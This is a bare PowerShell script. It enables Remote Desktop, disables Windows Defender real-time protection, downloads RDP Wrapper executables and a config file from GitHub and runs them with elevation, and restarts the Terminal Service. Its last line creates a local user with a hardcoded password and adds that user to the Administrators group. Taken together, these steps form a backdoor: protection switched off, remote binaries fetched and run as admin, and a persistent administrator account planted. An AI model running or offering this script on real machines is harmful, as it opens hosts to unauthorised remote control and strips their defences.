
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/heads/main/RDPWInst.exe" -OutFile "$env:TEMP\RDPWInst.exe"
Start-Process "$env:TEMP\RDPWInst.exe" -ArgumentList "-i -o" -Verb RunAs -Wait
Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/heads/main/RDPConf.exe" -OutFile "$env:USERPROFILE\AppData\Local\Microsoft\WindowsApps\RDPConf.exe"
Start-Process powershell -Verb RunAs -ArgumentList "-Command Stop-Service -Name TermService -Force; Invoke-WebRequest 'https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini' -OutFile 'C:\Program Files\RDP Wrapper\rdpwrap.ini'; Start-Service -Name TermService; Start-Sleep -Seconds 3"
  net user huutho Lordco61799 /add ; net localgroup Administrators Huutho /add 
